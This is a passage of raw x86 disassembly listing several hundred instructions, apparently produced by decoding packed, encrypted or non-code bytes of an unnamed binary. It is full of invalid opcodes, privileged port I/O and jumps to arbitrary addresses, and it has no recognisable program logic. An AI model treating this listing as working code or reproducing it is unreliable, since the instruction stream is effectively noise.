  40ae92:	dec    ebx
  40ae93:	fbstp  TBYTE PTR [ebx+ebp*1]
  40ae96:	clc    
  40ae97:	popa   
  40ae98:	scas   al,BYTE PTR es:[edi]
  40ae99:	pop    ebx
  40ae9a:	jbe    0x40af13
  40ae9c:	sahf   
  40ae9d:	push   ebp
  40ae9e:	test   DWORD PTR [ebp+0xec3f05],edi
  40aea4:	mov    dl,0x1d
  40aea6:	xor    al,0xf8
  40aea8:	pop    ss
  40aea9:	icebp  
  40aeaa:	pop    es
  40aeab:	mov    eax,0xa7b85b1c
  40aeb0:	ja     0x40aee9
  40aeb2:	call   0xab733c1c
  40aeb7:	hlt    
  40aeb8:	jle    0x40aed9
  40aeba:	stos   DWORD PTR es:[edi],eax
  40aebb:	stos   BYTE PTR es:[edi],al
  40aebc:	sbb    BYTE PTR [edx-0x53],cl
  40aebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aec1:	adc    al,0x2a
  40aec3:	mov    ah,0x6c
  40aec5:	jl     0x40af27
  40aec7:	test   eax,0x9b4f60ca
  40aecc:	push   ss
  40aecd:	push   0xfa66af52
  40aed2:	cwde   
  40aed3:	fnstsw WORD PTR [esp+eiz*8-0x20]
  40aed7:	cmp    bh,BYTE PTR [edi-0x5e13cadb]
  40aedd:	xor    eax,0x93932179
  40aee2:	cs popf 
  40aee4:	jle    0x40ae96
  40aee6:	cmp    ah,bl
  40aee8:	mov    esp,0xd3f523c6
  40aeed:	out    0x60,al
  40aeef:	es push ebp
  40aef1:	outs   dx,BYTE PTR ds:[esi]
  40aef2:	lock dec DWORD PTR [ebx+0x4cd046f8]
  40aef9:	adc    al,0xe2
  40aefb:	hlt    
  40aefc:	pop    ebp
  40aefd:	jecxz  0x40aede
  40aeff:	retf   0x3c1d
  40af02:	push   edx
  40af03:	xor    al,0xc2
  40af05:	cli    
  40af06:	data16 jnp 0x40af42
  40af09:	ins    BYTE PTR es:[edi],dx
  40af0a:	icebp  
  40af0b:	sub    DWORD PTR [ecx],0x6
  40af0e:	rcl    ebp,cl
  40af10:	pop    ss
  40af11:	inc    eax
  40af12:	je     0x40af77
  40af14:	mov    esp,0xe6b2503b
  40af19:	mov    eax,ds:0xc5ef4313
  40af1e:	jne    0x40aece
  40af20:	sub    bl,ah
  40af22:	mov    ds:0xe4cf511,al
  40af27:	je     0x40aecf
  40af29:	jg     0x40aecc
  40af2b:	dec    esi
  40af2c:	sahf   
  40af2d:	xchg   ebx,eax
  40af2e:	rol    ebp,cl
  40af30:	add    BYTE PTR [ebx+0x1a],cl
  40af33:	retf   
  40af34:	sub    bl,ch
  40af36:	or     al,0x83
  40af38:	dec    ecx
  40af39:	push   esi
  40af3a:	adc    eax,0x41f147ba
  40af3f:	and    DWORD PTR [edi+0x9],esp
  40af42:	popf   
  40af43:	fdivr  DWORD PTR [ecx]
  40af45:	pushf  
  40af46:	ficom  WORD PTR [eax-0xbd77aa5]
  40af4c:	out    0x5c,eax
  40af4e:	add    edi,DWORD PTR [edx+0x22]
  40af51:	ret    0x5bdf
  40af54:	adc    esp,edx
  40af56:	add    dl,BYTE PTR [ebp-0x6eecf848]
  40af5c:	mov    DWORD PTR [ebp+0x10],edx
  40af5f:	loope  0x40af97
  40af61:	push   edi
  40af62:	and    edx,DWORD PTR [ebx+0x25e0956]
  40af68:	push   edx
  40af69:	mov    ch,0xe4
  40af6b:	rol    DWORD PTR [ecx],1
  40af6d:	sub    dh,dh
  40af6f:	jns    0x40afc7
  40af71:	jno    0x40af65
  40af73:	mov    ah,0xbb
  40af75:	inc    ecx
  40af76:	ins    BYTE PTR es:[edi],dx
  40af77:	mov    WORD PTR [ebp+0x69c2f12a],?
  40af7d:	lods   al,BYTE PTR ds:[esi]
  40af7e:	shl    al,cl
  40af80:	ficomp DWORD PTR [ebp+0x54508a0c]
  40af86:	jae    0x40afb8
  40af88:	call   0x204e29f9
  40af8d:	std    
  40af8e:	inc    ecx
  40af8f:	ins    DWORD PTR es:[edi],dx
  40af90:	xor    dh,BYTE PTR [eax+0x4c]
  40af93:	test   al,0xae
  40af95:	pop    eax
  40af96:	mov    dl,0x74
  40af98:	xor    eax,0xa08efed6
  40af9e:	sub    al,0x35
  40afa0:	sbb    al,0x9e
  40afa2:	mov    cl,0x85
  40afa4:	mov    edx,0x7b94f314
  40afa9:	pop    es
  40afaa:	push   ebp
  40afab:	mov    cl,0x4f
  40afad:	mov    ch,0xc3
  40afaf:	fdivr  QWORD PTR [edx]
  40afb1:	ss mov al,0x24
  40afb4:	mov    al,0xef
  40afb6:	les    esi,FWORD PTR [esp+edx*4]
  40afb9:	add    edi,DWORD PTR [edi+0xd0af9e8]
  40afbf:	adc    BYTE PTR [edx+0xca123f4],bl
  40afc5:	sbb    bh,ah
  40afc7:	adc    BYTE PTR [ebx+esi*2+0x35],al
  40afcb:	loope  0x40b040
  40afcd:	clc    
  40afce:	push   0xffffffc2
  40afd0:	jle    0x40b017
  40afd2:	and    DWORD PTR [ecx-0x1f3367d],eax
  40afd8:	(bad)  
  40afd9:	xchg   ebx,eax
  40afda:	pop    ds
  40afdb:	and    al,BYTE PTR [esi]
  40afdd:	pop    ds
  40afde:	stc    
  40afdf:	in     al,0xe9
  40afe1:	aad    0xfa
  40afe3:	inc    ebx
  40afe4:	jg     0x40b023
  40afe6:	adc    BYTE PTR [esi+0x66946def],ch
  40afec:	mov    ah,0x22
  40afee:	and    BYTE PTR [ebx-0x4c28f5fe],bh
  40aff4:	popa   
  40aff5:	jo     0x40af89
  40aff7:	push   0xffffff82
  40aff9:	imul   ebx,DWORD PTR ds:0x613ca580,0xffffff90
  40b000:	cmp    esi,DWORD PTR [ecx+ebp*2-0x62314fdc]
  40b007:	sub    DWORD PTR [esi+0x5d81e20f],ebx
  40b00d:	cmp    al,BYTE PTR [esp+edx*8+0x173c84ec]
  40b014:	add    eax,0xfbda39a5
  40b019:	call   0x8b1b:0x7d748a86
  40b020:	stos   DWORD PTR es:[edi],eax
  40b021:	imul   ecx,DWORD PTR ds:0x644cd710,0xf87f4b3b
  40b02b:	(bad)  
  40b02c:	mov    ds:0x833707ac,eax
  40b031:	or     bh,0xf7
  40b034:	push   0xffffffa6
  40b036:	xor    BYTE PTR [eax+0x4e1bb59e],0x3b
  40b03d:	sub    DWORD PTR [edi+0x72],eax
  40b040:	je     0x40b082
  40b042:	cwde   
  40b043:	push   cs
  40b044:	push   esp
  40b045:	mov    dh,BYTE PTR [ecx-0x51]
  40b048:	pop    esi
  40b049:	mov    ecx,0xa965c12b
  40b04e:	sub    edx,DWORD PTR [eax+eax*1-0x67]
  40b052:	adc    eax,0xc19d3804
  40b057:	or     DWORD PTR [ebp+0x5b],edi
  40b05a:	pop    edx
  40b05b:	inc    esp
  40b05c:	adc    al,0x4b
  40b05e:	dec    eax
  40b05f:	add    DWORD PTR [eax-0x19],ebx
  40b062:	pop    ebx
  40b063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b064:	mov    ch,BYTE PTR [esi+edx*8+0x388feb9b]
  40b06b:	jmp    0x40b00e
  40b06d:	sub    DWORD PTR [ebp-0x4f],ebx
  40b070:	dec    esi
  40b071:	mov    ebx,0x70a3aa2d
  40b076:	cmp    al,BYTE PTR [esi]
  40b078:	or     eax,0x12038aae
  40b07d:	push   ss
  40b07e:	out    0xd7,eax
  40b080:	xor    ebp,edi
  40b082:	mov    ah,0xd0
  40b084:	mov    al,BYTE PTR [ecx]
  40b086:	adc    eax,0x36196a27
  40b08b:	or     BYTE PTR [ecx-0x7b],bh
  40b08e:	(bad)  
  40b08f:	adc    BYTE PTR [edx],bl
  40b091:	pop    esi
  40b092:	leave  
  40b093:	in     eax,dx
  40b094:	repz (bad) 
  40b096:	enter  0xd032,0xde
  40b09a:	rcl    esp,1
  40b09c:	inc    ecx
  40b09d:	xor    eax,0x8306f149
  40b0a2:	mov    dh,0x53
  40b0a4:	sub    ecx,DWORD PTR ds:0xaf9b5c04
  40b0aa:	js     0x40b0bc
  40b0ac:	jge    0x40b073
  40b0ae:	xor    eax,0x727067a5
  40b0b3:	xchg   esp,eax
  40b0b4:	ja     0x40b093
  40b0b6:	mov    bh,0xa0
  40b0b8:	or     al,0x50
  40b0ba:	fs cwde 
  40b0bc:	enter  0x6e34,0xe9
  40b0c0:	icebp  
  40b0c1:	jg     0x40b053
  40b0c3:	mov    eax,0x1a3a8a8c
  40b0c8:	xchg   ebx,eax
  40b0c9:	punpcklbw mm4,DWORD PTR [edx-0x28]
  40b0cd:	or     bh,BYTE PTR [edx]
  40b0cf:	out    0x32,eax
  40b0d1:	sahf   
  40b0d2:	dec    ecx
  40b0d3:	jo     0x40b0cb
  40b0d5:	clc    
  40b0d6:	jns    0x40b05c
  40b0d8:	and    cl,BYTE PTR [ecx+0x40]
  40b0db:	(bad)  
  40b0dc:	outs   dx,DWORD PTR ds:[esi]
  40b0dd:	inc    ebx
  40b0de:	mov    al,ds:0xc296bc49
  40b0e3:	add    eax,0x48fe04d9
  40b0e8:	dec    esp
  40b0e9:	popa   
  40b0ea:	xlat   BYTE PTR ds:[ebx]
  40b0eb:	lahf   
  40b0ec:	cmp    DWORD PTR [edx*8+0x3a3a67c],ebx
  40b0f3:	popa   
  40b0f4:	cmp    DWORD PTR [esi-0x209fec9e],0xc5c41e49
  40b0fe:	dec    esp
  40b0ff:	pop    ecx
  40b100:	fidivr DWORD PTR [eax+0x2acf51a8]
  40b106:	cwde   
  40b107:	xor    BYTE PTR [eax+eiz*4-0x1d],ah
  40b10b:	push   ecx
  40b10c:	fstp   QWORD PTR [ebx]
  40b10e:	pop    eax
  40b10f:	sar    BYTE PTR [eax-0x6ef36b34],0xe4
  40b116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b117:	sar    BYTE PTR [ecx+0x19],0x57
  40b11b:	jg     0x40b109
  40b11d:	dec    eax
  40b11e:	push   ds
  40b11f:	out    0xe,eax
  40b121:	aam    0x2d
  40b123:	in     eax,dx
  40b124:	sub    DWORD PTR [ecx-0x3f4a7b91],esi
  40b12a:	jmp    0x2e45:0xba30c324
  40b131:	xchg   ebx,eax
  40b132:	dec    edi
  40b133:	xchg   ecx,eax
  40b134:	adc    bh,dl
  40b136:	ins    BYTE PTR es:[edi],dx
  40b137:	div    BYTE PTR [ebx+0x73]
  40b13a:	adc    BYTE PTR [esi-0x14c72e97],dh
  40b140:	cmp    eax,0xcdb26b19
  40b145:	push   es
  40b146:	call   0x29a425d2
  40b14b:	daa    
  40b14c:	lock adc DWORD PTR [esi+edi*4-0x4cf12f0c],esi
  40b154:	mov    esi,0x9ba5fe54
  40b159:	mov    esp,0x1c25f3d2
  40b15e:	pop    ecx
  40b15f:	sub    DWORD PTR [ecx],0x76
  40b162:	sub    ah,BYTE PTR [esi-0x7305da94]
  40b168:	push   ebp
  40b169:	xor    edi,DWORD PTR [eax+0x1c0553e]
  40b16f:	sbb    al,0xe1
  40b171:	call   0x5423:0x62034231
  40b178:	or     eax,edi
  40b17a:	lods   al,BYTE PTR ds:[esi]
  40b17b:	mov    eax,0x81915505
  40b180:	loope  0x40b119
  40b182:	xor    BYTE PTR [eax-0x66e59c4f],bh
  40b188:	(bad)  
  40b189:	jecxz  0x40b18d
  40b18b:	fstp   QWORD PTR [ebp+0x77c435a1]
  40b191:	sub    DWORD PTR [ebx+edx*2+0x10],0xffffffaf
  40b196:	(bad)  
  40b197:	mov    ecx,?
  40b199:	xor    cl,BYTE PTR [ebx]
  40b19b:	test   DWORD PTR [esi+0x67],eax
  40b19e:	push   ebx
  40b19f:	push   ss
  40b1a0:	add    eax,esi
  40b1a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1a3:	fisub  WORD PTR [eax+edx*4]
  40b1a6:	(bad)  
  40b1a7:	imul   esp,DWORD PTR [esi],0x1c7ea0c7
  40b1ad:	push   0x5d422afd
  40b1b2:	jno    0x40b209
  40b1b4:	call   0xfe28e924
  40b1b9:	dec    ebx
  40b1ba:	mov    edi,0x225a609b
  40b1bf:	fldcw  WORD PTR [eax-0x4f8101ba]
  40b1c5:	pop    es
  40b1c6:	ror    ah,cl
  40b1c8:	sahf   
  40b1c9:	bsr    edx,esi
  40b1cc:	add    eax,0xb70e9b62
  40b1d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1d2:	dec    edi
  40b1d3:	shl    DWORD PTR [edx-0x2284a989],cl
  40b1d9:	aam    0x8a
  40b1db:	dec    ecx
  40b1dc:	xor    bh,BYTE PTR [ebx]
  40b1de:	jne    0x40b1c4
  40b1e0:	mov    ds:0x66e44de8,al
  40b1e5:	pop    ebx
  40b1e6:	adc    ebp,DWORD PTR [esi]
  40b1e8:	jnp    0x40b23d
  40b1ea:	jne    0x40b1d3
  40b1ec:	jb     0x40b1e8
  40b1ee:	sbb    al,0xa9
  40b1f0:	or     al,0x2c
  40b1f2:	call   0xe95e:0x6f640564
  40b1f9:	int3   
  40b1fa:	ficom  DWORD PTR [ebx-0x4d941040]
  40b200:	fst    st(2)
  40b202:	push   ss
  40b203:	or     DWORD PTR [ebx+0x4228947b],esi
  40b209:	aaa    
  40b20a:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b20c:	add    eax,0x266c5652
  40b211:	sub    al,0x77
  40b213:	out    dx,al
  40b214:	rcl    bl,1
  40b216:	sahf   
  40b217:	pop    eax
  40b218:	add    dh,BYTE PTR [edi-0x7c2b93a9]
  40b21e:	inc    ebp
  40b21f:	(bad)  
  40b220:	mov    dh,0x16
  40b222:	pop    esi
  40b223:	imul   eax,DWORD PTR [ecx-0x77],0xdd2fa5f7
  40b22a:	or     ebp,DWORD PTR [eax+0x508cd977]
  40b230:	cmp    dl,BYTE PTR [edi+0x1667794b]
  40b236:	(bad)  
  40b237:	mov    ch,0xb2
  40b239:	inc    edx
  40b23a:	loop   0x40b28a
  40b23c:	aaa    
  40b23d:	cmp    al,0xd4
  40b23f:	push   esi
  40b240:	mov    ecx,0xc27fa5b4
  40b245:	inc    esp
  40b246:	and    bh,BYTE PTR [edx+0x7]
  40b249:	arpl   WORD PTR [edi+0xd],cx
  40b24c:	sbb    esi,ecx
  40b24e:	les    ecx,FWORD PTR [ecx-0x74]
  40b251:	push   esi
  40b252:	jle    0x40b21e
  40b254:	leave  
  40b255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b256:	ret    0xb2a8
  40b259:	sbb    BYTE PTR [edx],al
  40b25b:	cld    
  40b25c:	scas   eax,DWORD PTR es:[edi]
  40b25d:	sub    edi,DWORD PTR [ebp+0x62]
  40b260:	fwait
  40b261:	mov    ebx,0xecda3976
  40b266:	enter  0x7e95,0x7c
  40b26a:	aam    0xee
  40b26c:	pusha  
  40b26d:	fcom   QWORD PTR [eax+eax*2]
  40b270:	fidiv  WORD PTR [ecx-0xfc158db]
  40b276:	jmp    0xe7079986
  40b27b:	mov    al,ds:0xc84310fd
  40b280:	aaa    
  40b281:	nop
  40b282:	xor    eax,0x5ba42871
  40b287:	mov    al,ds:0xc5f4ab59
  40b28c:	mov    esp,0x32ea6e01
  40b291:	inc    esi
  40b292:	xor    ch,BYTE PTR [edi-0x4e]
  40b295:	das    
  40b296:	adc    DWORD PTR [esi+0x26119786],ebx
  40b29c:	jbe    0x40b28a
  40b29e:	nop
  40b29f:	inc    ebp
  40b2a0:	fcmovnbe st,st(1)
  40b2a2:	jb     0x40b285
  40b2a4:	pop    esp
  40b2a5:	pop    ebp
  40b2a6:	jp     0x40b2ed
  40b2a8:	out    dx,eax
  40b2a9:	sub    BYTE PTR [esi+0x21ed53bc],al
  40b2af:	mov    DWORD PTR [ecx-0x30],eax
  40b2b2:	push   ecx
  40b2b3:	cmp    DWORD PTR ds:0x749cd2fa,edx
  40b2b9:	fisttp WORD PTR [di]
  40b2bc:	mov    ecx,0x8c34fc42
  40b2c1:	mov    DWORD PTR [edx+0x75],ecx
  40b2c4:	stos   BYTE PTR es:[edi],al
  40b2c5:	icebp  
  40b2c6:	repz mov eax,ds:0x249119c4
  40b2cc:	add    DWORD PTR [ebx+0x4ae37d3e],0xd69f72a1
  40b2d6:	popf   
  40b2d7:	aas    
  40b2d8:	sbb    DWORD PTR [ebp-0x38],ebx
  40b2db:	fisub  WORD PTR [edi+0x7043c417]
  40b2e1:	cld    
  40b2e2:	cmp    al,0x9f
  40b2e4:	mov    ds:0xa263c22d,eax
  40b2e9:	mov    eax,ds:0x36f74854
  40b2ee:	pop    esp
  40b2ef:	mov    ds:0x63ddd100,eax
  40b2f4:	pop    edx
  40b2f5:	jo     0x40b360
  40b2f7:	sbb    al,0x46
  40b2f9:	cmp    DWORD PTR [eax-0x11],esp
  40b2fc:	mov    BYTE PTR [esi],dh
  40b2fe:	scas   eax,DWORD PTR es:[edi]
  40b2ff:	jb     0x40b312
  40b301:	jge    0x40b2ef
  40b303:	inc    ebp
  40b304:	xchg   DWORD PTR [ecx-0x40972d9d],ebx
  40b30a:	adc    dh,BYTE PTR [ecx+edi*8+0x5196f97e]
  40b311:	xor    dl,ch
  40b313:	fwait
  40b314:	or     ch,BYTE PTR [eax+0x5d]
  40b317:	lea    eax,[ebx]
  40b319:	shr    DWORD PTR [eax],1
  40b31b:	cli    
  40b31c:	call   0x11da4f37
  40b321:	repz bound ebx,QWORD PTR [bx+0x15e0]
  40b327:	push   ds
  40b328:	adc    al,0x88
  40b32a:	lock repz and ecx,DWORD PTR [edx+ebp*2-0x7]
  40b330:	add    bl,ch
  40b332:	icebp  
  40b333:	je     0x40b30e
  40b335:	das    
  40b336:	mov    ds:0xbeccdcbc,al
  40b33b:	adc    ebp,esi
  40b33d:	add    dh,BYTE PTR [ecx-0x60]
  40b340:	and    eax,0x75d09a4a
  40b345:	jo     0x40b3a1
  40b347:	ss xchg esp,eax
  40b349:	cs bswap edx
  40b34c:	jbe    0x40b2d8
  40b34e:	xchg   edx,eax
  40b34f:	test   BYTE PTR [eax+0x79],dl
  40b352:	out    0xea,al
  40b354:	jb     0x40b2eb
  40b356:	fs jecxz 0x40b39b
  40b359:	push   0x4b303708
  40b35e:	xchg   ebp,eax
  40b35f:	adc    BYTE PTR [esi+0x44a63472],0xe4
  40b366:	add    DWORD PTR [edi],ebp
  40b368:	mov    al,ds:0x6784e4c1
  40b36d:	jmp    0x336bc016
  40b372:	loop   0x40b36d
  40b374:	enter  0xfe6,0x86
  40b378:	loope  0x40b3f1
  40b37a:	push   0xffffffee
  40b37c:	test   al,0x9e
  40b37e:	adc    ah,BYTE PTR [edx]
  40b380:	out    0x37,eax
  40b382:	xchg   ebp,eax
  40b383:	rcl    DWORD PTR [edi+0x6275f525],0xe8
  40b38a:	addr16 cmp al,0x90
  40b38d:	aas    
  40b38e:	mov    ds:0xfc497fd6,eax
  40b393:	fisub  WORD PTR [ebx]
  40b395:	popf   
  40b396:	sti    
  40b397:	pop    es
  40b398:	sub    BYTE PTR [edx+0x58],ch
  40b39b:	jne    0x40b38b
  40b39d:	mov    cl,0xd3
  40b39f:	pusha  
  40b3a0:	loop   0x40b3d4
  40b3a2:	mov    DWORD PTR [esi],ecx
  40b3a4:	dec    esp
  40b3a5:	test   al,0x3a
  40b3a7:	repz push cs
  40b3a9:	pop    edx
  40b3aa:	rcr    BYTE PTR [ebp+0x6160b925],0xf5
  40b3b1:	mov    ecx,0x66682e6f
  40b3b6:	cmp    bh,cl
  40b3b8:	fnstenv [eax-0x36eb532]
  40b3be:	mov    eax,ds
  40b3c0:	inc    esi
  40b3c1:	fwait
  40b3c2:	push   ebp
  40b3c3:	jb     0x40b422
  40b3c5:	call   0xbae7983
  40b3ca:	adc    BYTE PTR [ebp-0x34],ch
  40b3cd:	imul   edx,DWORD PTR [ecx+0x1e],0x50f311a
  40b3d4:	dec    esi
  40b3d5:	push   esi
  40b3d6:	sub    al,0xb0
  40b3d8:	push   eax
  40b3d9:	push   es
  40b3da:	mov    cs,WORD PTR [ecx]
  40b3dc:	int    0xda
  40b3de:	pop    edi
  40b3df:	js     0x40b372
  40b3e1:	push   eax
  40b3e2:	add    bl,BYTE PTR [edx+0x0]
  40b3e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3e6:	faddp  st(5),st
  40b3e8:	mov    cl,0x66
  40b3ea:	lods   al,BYTE PTR ds:[esi]
  40b3eb:	jno    0x40b3bf
  40b3ed:	xchg   edi,eax
  40b3ee:	pop    ss
  40b3ef:	mov    dh,BYTE PTR [edx+0x54]
  40b3f2:	mov    al,0xab
  40b3f4:	pop    edx
  40b3f5:	xchg   ah,cl
  40b3f7:	idiv   DWORD PTR [ecx-0xa5ec41e]
  40b3fd:	mov    eax,0xb6681de5
  40b402:	mul    DWORD PTR [esi+0xf]
  40b405:	sbb    BYTE PTR [ebx+0xdf8acdd],al
  40b40b:	push   ebp
  40b40c:	mov    ebp,0xdc8dda67
  40b411:	retf   
  40b412:	adc    eax,0xaeadd249
  40b417:	outs   dx,BYTE PTR ds:[esi]
  40b418:	call   DWORD PTR [eax+0x1e97a9cc]
  40b41e:	sbb    ch,BYTE PTR [esi-0x1629ea67]
  40b424:	mov    BYTE PTR [esi+esi*4+0x23418ed3],dl
  40b42b:	js     0x40b41a
  40b42d:	cmp    eax,0x3fe1ba05
  40b432:	dec    ecx
  40b433:	(bad)  
  40b434:	mov    esp,0x2eb8727f
  40b439:	mov    eax,0xfd42ceac
  40b43e:	mov    bl,cl
  40b440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b441:	setbe  BYTE PTR [ebp+0x13]
  40b445:	adc    ecx,ebx
  40b447:	ins    DWORD PTR es:[edi],dx
  40b448:	cvttps2pi mm3,xmm6
  40b44b:	inc    esp
  40b44c:	pop    edx
  40b44d:	dec    esi
  40b44e:	or     esi,DWORD PTR [esi+0x52]
  40b451:	mov    dl,0x79
  40b453:	inc    edx
  40b454:	mov    ch,0xbd
  40b456:	mov    edi,fs
  40b458:	into   
  40b459:	xchg   ebp,eax
  40b45a:	push   ecx
  40b45b:	into   
  40b45c:	jmp    0x40b4c2
  40b45e:	push   DWORD PTR [edi-0x58392e4e]
  40b464:	stc    
  40b465:	xchg   ebx,eax
  40b466:	inc    esp
  40b467:	sahf   
  40b468:	int3   
  40b469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b46a:	(bad)  
  40b46b:	stos   BYTE PTR es:[edi],al
  40b46c:	xchg   edi,eax
  40b46d:	jp     0x40b4c2
  40b46f:	or     al,BYTE PTR [eax+ebp*4-0x5e]
  40b473:	in     al,dx
  40b474:	mov    al,0x51
  40b476:	call   FWORD PTR [edi+0x18]
  40b479:	iret   
  40b47a:	mov    eax,0xe348652b
  40b47f:	scas   al,BYTE PTR es:[edi]
  40b480:	mov    ah,0x93
  40b482:	pop    edi
  40b483:	scas   al,BYTE PTR es:[edi]
  40b484:	mov    cl,0x7e
  40b486:	and    edx,DWORD PTR [ebp+0x76]
  40b489:	ins    BYTE PTR es:[edi],dx
  40b48a:	xor    ah,ah
  40b48c:	loope  0x40b484
  40b48e:	js     0x40b45f
  40b490:	lods   eax,DWORD PTR ds:[esi]
  40b491:	mov    bh,0xa
  40b493:	cmc    
  40b494:	mov    esi,0x4c40cc06
  40b499:	fsubrp st(5),st
  40b49b:	clc    
  40b49c:	jo     0x40b48e
  40b49e:	pop    es
  40b49f:	sub    DWORD PTR [esi],ecx
  40b4a1:	jle    0x40b480
  40b4a3:	mov    ebx,0xf4bbbdbe
  40b4a8:	mov    al,0xe7
  40b4aa:	out    dx,eax
  40b4ab:	or     BYTE PTR [ebp-0x2a7c2221],ah
  40b4b1:	xchg   esp,eax
  40b4b2:	inc    esi
  40b4b3:	retf   
  40b4b4:	adc    dl,ah
  40b4b6:	fcom   DWORD PTR [esi]
  40b4b8:	cmp    ch,BYTE PTR es:[ecx+edi*2]
  40b4bc:	(bad)  
  40b4bd:	jecxz  0x40b47e
  40b4bf:	fcmovbe st,st(5)
  40b4c1:	mov    ch,0x42
  40b4c3:	arpl   WORD PTR [edi+0x30543c93],ax
  40b4c9:	dec    esp
  40b4ca:	or     al,0x87
  40b4cc:	aaa    
  40b4cd:	push   es
  40b4ce:	loopne 0x40b464
  40b4d0:	mov    DWORD PTR [eax-0x67dcf35b],ebp
  40b4d6:	or     DWORD PTR [ebx-0x12],ebp
  40b4d9:	adc    DWORD PTR [esi],eax
  40b4db:	or     dl,BYTE PTR [edi+eax*4-0x6f]
  40b4df:	pop    ds
  40b4e0:	push   edi
  40b4e1:	cmp    BYTE PTR [esi],bh
  40b4e3:	sahf   
  40b4e4:	stos   DWORD PTR es:[edi],eax
  40b4e5:	jl     0x40b4e7
  40b4e7:	inc    esi
  40b4e8:	xchg   edi,eax
  40b4e9:	ror    bl,0x4c
  40b4ec:	out    0x7a,al
  40b4ee:	loopne 0x40b486
  40b4f0:	sub    DWORD PTR [ebx+edx*8+0x11],edx
  40b4f4:	or     DWORD PTR ds:0x67ec5fd5,0xf4b509d3
  40b4fe:	dec    esp
  40b4ff:	pop    edx
  40b500:	das    
  40b501:	push   ds
  40b502:	fbld   TBYTE PTR [esp+eiz*2-0x3b]
  40b506:	or     esi,edi
  40b508:	lods   al,BYTE PTR ds:[esi]
  40b509:	lds    esi,FWORD PTR [esi+0x1b]
  40b50c:	or     al,0xc0
  40b50e:	add    edi,DWORD PTR ds:0xab36a751
  40b514:	ins    DWORD PTR es:[edi],dx
  40b515:	mov    ecx,0x46894a75
  40b51a:	rol    DWORD PTR [esi+0x31],0x7e
  40b51e:	xor    ecx,DWORD PTR [esi+0x6317b7b8]
  40b524:	prefetcht2 BYTE PTR [ecx-0x74]
  40b528:	xchg   esi,eax
  40b529:	sbb    al,0xf4
  40b52b:	stc    
  40b52c:	add    DWORD PTR ds:[ecx+0x41ea7313],esp
  40b533:	mov    bl,0xe1
  40b535:	jle    0x40b576
  40b537:	push   edi
  40b538:	adc    DWORD PTR [edx-0xb22faff],ecx
  40b53e:	ret    0x157f
  40b541:	add    BYTE PTR [ecx+0x3dfc25a5],bh
  40b547:	adc    DWORD PTR [edx+edx*4+0x5],ebp
  40b54b:	and    al,0x42
  40b54d:	fst    QWORD PTR [ecx]
  40b54f:	fist   DWORD PTR [ebx]
  40b551:	xor    BYTE PTR [edi+0x22],dl
  40b554:	sub    BYTE PTR [eax-0x3120521c],bl
  40b55a:	sti    
  40b55b:	in     eax,0x99
  40b55d:	out    0x7c,eax
  40b55f:	dec    ebx
  40b560:	dec    esp
  40b561:	mov    cl,0xda
  40b563:	push   eax
  40b564:	leave  
  40b565:	mov    ds:0xa8cf503,eax
  40b56a:	or     DWORD PTR [esi],edx
  40b56c:	cmp    cl,ah
  40b56e:	les    ecx,FWORD PTR [ebp+edx*1+0x63]
  40b572:	fwait
  40b573:	int    0x7
  40b575:	dec    ebx
  40b576:	sbb    BYTE PTR [ecx+0x7b846060],0x67
  40b57d:	scas   eax,DWORD PTR es:[edi]
  40b57e:	jae    0x40b552
  40b580:	shl    BYTE PTR [ecx],1
  40b582:	pop    esp
  40b583:	jae    0x40b55c
  40b585:	jmp    0x5b6c6a15
  40b58a:	pop    eax
  40b58b:	test   eax,0x6642f96c
  40b590:	pop    edi
  40b591:	xor    DWORD PTR [edi],0x74194d25
  40b597:	or     BYTE PTR [ebp+0x47],0x34
  40b59b:	out    0xbd,al
  40b59d:	pop    edi
  40b59e:	std    
  40b59f:	jnp    0x40b60a
  40b5a1:	je     0x40b582
  40b5a3:	mov    fs,WORD PTR [edx+0x13]
  40b5a6:	dec    ebx
  40b5a7:	retf   0xe080
  40b5aa:	out    dx,eax
  40b5ab:	xchg   DWORD PTR [ecx+0x26],eax
  40b5ae:	pop    ss
  40b5af:	shl    DWORD PTR [edi-0x58],0x67
  40b5b3:	(bad)  
  40b5b4:	cli    
  40b5b5:	adc    ah,BYTE PTR [edi-0x3]
  40b5b8:	fwait
  40b5b9:	stos   BYTE PTR es:[edi],al
  40b5ba:	imul   BYTE PTR ds:0x270c429b
  40b5c0:	add    dh,BYTE PTR [edi-0x654379f1]
  40b5c6:	out    dx,al
  40b5c7:	jnp    0x40b5da
  40b5c9:	mov    edx,DWORD PTR [ecx-0x5c]
  40b5cc:	mov    ah,0xd4
  40b5ce:	adc    ecx,eax
  40b5d0:	mov    esi,0xba345e70
  40b5d5:	jne    0x40b63b
  40b5d7:	cli    
  40b5d8:	(bad)  
  40b5d9:	out    dx,eax
  40b5da:	and    eax,0xadd05da9
  40b5df:	jp     0x40b600
  40b5e1:	xchg   ecx,eax
  40b5e2:	cmp    DWORD PTR [ebp-0x7d],ebp
  40b5e5:	sub    DWORD PTR [eax+0x50],eax
  40b5e8:	loope  0x40b59f
  40b5ea:	lods   al,BYTE PTR ds:[esi]
  40b5eb:	leave  
  40b5ec:	jb     0x40b66a
  40b5ee:	fst    QWORD PTR [edi-0x24]
  40b5f1:	sub    esi,edx
  40b5f3:	lods   al,BYTE PTR ds:[esi]
  40b5f4:	hlt    
  40b5f5:	mov    bh,al
  40b5f7:	inc    edi
  40b5f8:	out    dx,eax
  40b5f9:	add    ebx,DWORD PTR [ebx-0x27]
  40b5fc:	dec    esp
  40b5fd:	enter  0xa442,0x88
  40b601:	sahf   
  40b602:	dec    ebx
  40b603:	in     al,dx
  40b604:	pop    esp
  40b605:	dec    ebp
  40b606:	and    esi,edi
  40b608:	inc    edx
  40b609:	mov    ds:0x42950c3c,al
  40b60e:	je     0x40b594
  40b610:	arpl   cx,cx
  40b612:	ret    
  40b613:	scas   eax,DWORD PTR es:[edi]
  40b614:	mov    edi,0xafa377f1
  40b619:	sahf   
